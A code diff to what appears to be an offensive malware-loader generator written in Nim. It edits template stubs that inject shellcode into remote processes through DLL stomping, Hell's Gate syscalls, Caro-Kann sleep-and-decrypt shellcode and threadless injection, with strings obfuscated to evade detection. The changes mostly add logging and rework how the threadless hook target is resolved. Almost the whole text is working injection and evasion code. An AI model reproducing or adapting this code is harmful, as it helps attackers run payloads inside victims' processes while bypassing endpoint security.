@@ -369,12 +369,19 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("\r\n[*] Injecting DLL: "), stombDll, " into the remote process"
                     
+                    when defined(logFile):
+                        logVerbose(obf("[*] Injecting DLL \r\n"))
+
                     if(remoteLoadDll(DLLPATH, tProcess)):
                         when defined(verbose):
                             echo obf("[+] DLL injected successfully")
+                        when defined(logFile):
+                            logVerbose(obf("[+] DLL injected successfully\r\n"))
                     else:
                         when defined(verbose):
                             echo obf("[-] DLL injection failed")
+                        when defined(logFile):
+                            logVerbose(obf("[-] DLL injection failed\r\n"))
                         quit(1)
                     
                     var module = GetRemoteModuleHandle(tProcess, stombDll)
@@ -382,6 +389,9 @@ let ShellcoderemoteinjectStub * = """
                         echo obf("[*] Using "), stombDll, obf(" .text section as shellcode buffer")
                         echo obf("[*] Found baseAddress at: "), repr(module)
                     
+                    when defined(logFile):
+                        logVerbose(obf("[*] Found baseAddress at: ") & cast[string](repr(module)) & "\r\n")
+
                     ds = GetRemoteProcAddress(tProcess, module, stombFunc)
                     rPtr2 = ds
                     when defined(verbose):
@@ -425,6 +435,9 @@ let ShellcoderemoteinjectStub * = """
                     var protAddress: LPVOID = ds
                     var oProtect: DWORD
                     status = NtProtectVirtualMemory(tProcess, addr protAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
+                    when defined(logFile):
+                        logVerbose(obf("[*] Buffer address: ") & cast[string](repr(ds)) & "\r\n")
+                        logVerbose(obf("[*] NtProtectVirtualMemory RW for address: ") & cast[string](repr(protAddress)) & obf(" status: ") & cast[string](toHex(status)) & "\r\n")
                     when defined(verbose):
                         if (status == 0):
                             echo obf("[+] NtProtectVirtualMemory success! "), repr(protAddress)
@@ -432,11 +445,14 @@ let ShellcoderemoteinjectStub * = """
                             echo obf("[-] NtProtectVirtualMemory failed! "), repr(protAddress)
                             quit(1)
                         echo "[*] Buffer address: ", repr(ds)
+                    
 
                 else:
                     status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
                     when defined(verbose):
                         echo obf("[*] NtAllocateVirtualMemory: "), status
+                    when defined(logFile):
+                        logVerbose(obf("[*] NtAllocateVirtualMemory: ") & cast[string](toHex(status)) & "\r\n")
             
             var bytesWritten: SIZE_T
             
@@ -478,6 +494,11 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("[*] NtWriteVirtualMemory: "), status
                     echo obf("    \\-- bytes written: "), bytesWritten
                     echo obf("")
+                
+                when defined(logFile):
+                    logVerbose(obf("[*] NtWriteVirtualMemory: ") & cast[string](toHex(status)) & "\r\n")
+                    logVerbose(obf("    \\-- bytes written: ") & cast[string](bytesWritten) & "\r\n")
+                    logVerbose("\r\n")
                 
                 when not defined(carokann):
                     when defined(RX):
@@ -526,6 +547,8 @@ let ShellcoderemoteinjectStub * = """
                 when defined(verbose):
                     echo  obf("[*] Allocating memory for our custom shellcode, which will decrypt and re-protect")
                 
+                when defined(logFile):
+                    logVerbose(obf("[*] Allocating memory for our custom shellcode, which will decrypt and re-protect\r\n"))
 
                 when defined(stomb):
                     when defined(verbose):
@@ -536,7 +559,9 @@ let ShellcoderemoteinjectStub * = """
                     #rPtr2 = rPtr2
                     when defined(verbose):
                         echo obf("[*] Found "), stombFunc2, obf(" address at: "), repr(rPtr2)
-                    
+                    when defined(logFile):
+                        logVerbose(obf("[*] Found baseAddress at: ") & cast[string](repr(rPtr2)) & "\r\n")
+                        logVerbose(obf("[*] Found ") & cast[string](stombFunc2) & obf(" address at: ") & cast[string](repr(rPtr2)) & "\r\n")
                     protectAddress = rPtr2
                     # as the function won't start at the section start, the protectAddress will have an
                     # offset to the address where we write the shellcode later on. This could lead to a problem,
@@ -545,6 +570,9 @@ let ShellcoderemoteinjectStub * = """
                     # Or we just allocate one more 4kB page so make sure the offset is no problem
                     var allocateSize: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len) + 0x1000
                     status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
+                    when defined(logFile):
+                        logVerbose(obf("[*] NtProtectVirtualMemory RW for address: ") & cast[string](repr(protectAddress)) & obf(" status: ") & cast[string](toHex(status)) & "\r\n")
+                    
                     when defined(verbose):
                         if (status == 0):
                             echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
@@ -567,12 +595,16 @@ let ShellcoderemoteinjectStub * = """
                         addr hook_sc_size,
                         MEM_COMMIT or MEM_RESERVE,
                         PAGE_READWRITE)
+                    when defined(logFile):
+                        logVerbose(obf("[*] NtAllocateVirtualMemory for Caro-Kann shellcode: ") & cast[string](toHex(status)) & "\r\n")
+                        
                     when defined(verbose):
                         if (status == 0):
                             echo obf("[+] NtAllocateVirtualMemory for Caro-Kann shellcode success "), repr(rPtr2)
                         else:
                             echo obf("[-] NtAllocateVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2)
                             quit(1)
+                    
 
                 # The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xE2. Now we want to replace the first egg with the value of
                 # the newly allocated memory address rptr, and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address
@@ -651,9 +683,15 @@ let ShellcoderemoteinjectStub * = """
                     else:
                         when defined(verbose):
                             echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                
+                when defined(logFile):
+                    logVerbose(obf("[*] Writing Caro-Kann shellcode into remote process rPtr2 address: ") & cast[string](repr(rPtr2)) & "\r\n")
 
                 status = NtWriteVirtualMemory(tProcess, rPtr2, unsafeAddr hookShellcodeBytes[0], hook_sc_size, addr bytesWritten)
-
+                
+                when defined(logFile):
+                    logVerbose(obf("[*] NtWriteVirtualMemory for Caro-Kann shellcode success! ") & cast[string](repr(rPtr2)) & "\r\n")
+                   
                 if (status == 0):
                     when defined(verbose):
                         echo obf("[+] NtWriteVirtualMemory for Caro-Kann shellcode success! "), repr(rPtr2)
@@ -663,7 +701,8 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("[-] NtWriteVirtualMemory for Caro-Kann shellcode failed "), repr(rPtr2) ," ",  toHex(status)
                     quit(1)
-
+                
+                
                 # Setting permissions to RX via VirtualProtectEx
 
                 when defined(Hellsgate):
@@ -676,7 +715,10 @@ let ShellcoderemoteinjectStub * = """
                 #var oldProtect: DWORD
                 protectAddress = rPtr2
                 status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr hook_sc_size, PAGE_EXECUTE_READ, addr oldProtect)
-
+                
+                when defined(logFile):
+                    logVerbose(obf("[*] NtProtectVirtualMemory RX for address: ") & cast[string](repr(protectAddress)) & obf(" status: ") & cast[string](toHex(status)) & "\r\n")
+                    
                 if (status == 0):
                     when defined(verbose):
                         echo obf("[+] NtProtectVirtualMemory for Caro-Kann shellcode success! "), repr(protectAddress)
@@ -686,12 +728,17 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("[-] NtProtectVirtualMemory for Caro-Kann shellcode failed!")
                     quit(1)
+                
+
                 ds = rPtr2
             
             when defined(stomb):
                 # as the execute primitive should now execute our custom shellcode, we need to set ds to the address of the shellcode. 
                 # It will automatically jump to the regular shellcode after sleep, decryption and re-protect.
                 ds = rPtr2
+            
+            when defined(logFile):
+                logVerbose(obf("[*] Address for rPtr2 is: ") & cast[string](repr(rPtr2)) & "\r\n")
 
 
             when defined(restore): # void function
@@ -786,14 +833,19 @@ let ShellcoderemoteinjectStub * = """
                         quit(1)
                     when defined(verbose):
                         echo obf("[*] Found address of "), threadlessFunction, obf(" at "), toHex(cast[HANDLE](remoteProc)), "\r\n"
-                
+                when defined(logFile):
+                    logVerbose(obf("[*] ThreadlessInject2 start") & "\r\n")
                 # Call threadlessThread with target process, shellcode address and targetFunction address
                 var threadlessSuccess: bool = threadlessThread(tProcess, ds, remoteProc)
                 if threadlessSuccess == false:
                     when defined(verbose):
                         echo obf("[-] Failed to create threadless thread")
+                    when defined(logFile):
+                        logVerbose(obf("[-] Failed to create threadless thread\r\n"))
                     quit(1)
                 when defined(verbose):
+                    when defined(logFile):
+                        logVerbose(obf("[+] Threadless thread created successfully\r\n"))
                     echo obf("[+] Threadless thread created successfully")
                 when defined(restore):
                     restoreText()
@@ -888,6 +940,9 @@ let ShellcoderemoteinjectStub_notepad * = """
         var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
 
         cid.UniqueProcess = remoteProcID
+
+        when defined(logFile):
+            logVerbose(obf("[*] In the Inject function \r\n"))
 
 """
 
@@ -1174,6 +1229,8 @@ let RemoteLoadDllStub* = """
             when defined(verbose):
                 echo obf("[*] NtAllocateVirtualMemory: "), toHex(status), " ", repr(ds)
             var bytesWritten: SIZE_T
+            when defined(logFile):
+                logVerbose(obf("[*] NtAllocateVirtualMemory for DLL Name: ")& cast[string](toHex(status))& " " & cast[string](repr(ds)) & "\r\n")
 
             when defined(Hellsgate):
                 if getSyscall(ntWriteTable):
@@ -1195,6 +1252,10 @@ let RemoteLoadDllStub* = """
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
             
+            when defined(logFile):
+                logVerbose(obf("[*] NtWriteVirtualMemory for DLL Name: ")& cast[string](toHex(status))& " " & cast[string](toHex(bytesWritten)) & "\r\n")
+
+
             when defined(Hellsgate):
                 if getSyscall(ntProtectTable):
                     syscall = ntProtectTable.wSysCall
@@ -1251,6 +1312,10 @@ let RemoteLoadDllStub* = """
                     when defined(verbose):
                         echo "[+] Allocate memory for loadLibrary Shellcode success"
                 
+                when defined(logFile):
+                    logVerbose(obf("[*] NtAllocateVirtualMemory for LoadLibrary: ")& cast[string](toHex(ntcode))& " " & cast[string](repr(loadLibraryAddress)) & "\r\n")
+
+
                 when defined(Hellsgate):
                     if getSyscall(ntWriteTable):
                         syscall = ntWriteTable.wSysCall
@@ -1264,6 +1329,9 @@ let RemoteLoadDllStub* = """
                     when defined(verbose):
                         echo "[+] Write Shellcode success"
                 
+                when defined(logFile):
+                    logVerbose(obf("[*] NtWriteVirtualMemory for LoadLibrary: ")& cast[string](toHex(ntcode))& " " & cast[string](toHex(szOutput)) & "\r\n")
+
                 when defined(Hellsgate):
                     if getSyscall(ntProtectTable):
                         syscall = ntProtectTable.wSysCall
@@ -1278,21 +1346,50 @@ let RemoteLoadDllStub* = """
                         echo "[+] Re-Protected to RX success"
                 when defined(verbose):
                     echo "[+] LoadLibraryW shellcode written at : ", repr(protectionRXAddress)
+                
+                when defined(logFile):
+                    logVerbose(obf("[*] NtProtectVirtualMemory for LoadLibrary: ")& cast[string](toHex(ntcode))& " " & cast[string](toHex(szOutput)) & "\r\n")
+                
+                var threadlessRoutine: LPVOID = nil
+                if (threadlessDLL == obf("ntdll.dll")):
+                    # get module from local proc and GetProcAddress for the function afterwards as its the same
+                    var remoteModHandle: HMODULE = GetModuleHandle(threadlessDLL)
 
-                var remoteModHandle: HMODULE = GetRemoteModuleHandle(tProcess, threadlessDLL)
-                if (remoteModHandle == 0):
+                    if (remoteModHandle == 0):
+                        when defined(verbose):
+                            echo "[-] Cannot retrieve module"
+                        when defined(logFile):
+                            logVerbose(obf("[-] Cannot retrieve module") & "\r\n")
+                        return false
+
+                    threadlessRoutine = cast[LPVOID](GetProcAddress(remoteModHandle, threadlessFunction))
+                    if(threadlessRoutine == nil):
+                        when defined(verbose):
+                            echo "[-] Cannot retrieve function"
+                        when defined(logFile):
+                            logVerbose(obf("[-] Cannot retrieve function") & "\r\n")
+                        return false
+                else:
+
+                    var remoteModHandle: HMODULE = GetRemoteModuleHandle(tProcess, threadlessDLL)
+                    if (remoteModHandle == 0):
+                        when defined(verbose):
+                            echo "[-] Cannot retrieve module"
+                        when defined(logFile):
+                            logVerbose(obf("[-] Cannot retrieve module") & "\r\n")
+                        return false
+
+                    threadlessRoutine = cast[LPVOID](GetRemoteProcAddress(tProcess, remoteModHandle, threadlessFunction))
                     when defined(verbose):
-                        echo "[-] Cannot retrieve module"
-                    return false
+                        echo "[*] Threadless routine: ", repr(threadlessRoutine)
 
-                var threadlessRoutine: LPVOID = cast[LPVOID](GetRemoteProcAddress(tProcess, remoteModHandle, threadlessFunction))
-                when defined(verbose):
-                    echo "[*] Threadless routine: ", repr(threadlessRoutine)
-
-
+                when defined(logFile):
+                        logVerbose(obf("[*] Starting ThreadlessInject") & "\r\n")
                 var threadSuccess = threadlessThread(tProcess, loadLibraryAddress, threadlessRoutine)
                 when defined(verbose):
                     echo "Threadless inject success: ", threadSuccess
+                when defined(logFile):
+                    logVerbose(obf("[*] ThreadlessInject success: ") & cast[string](toHex(threadSuccess)) & "\r\n")
                 
 
                 status = NtFreeVirtualMemory(tProcess, &loadLibraryAddress, &pageSize, MEM_DECOMMIT or MEM_RELEASE)
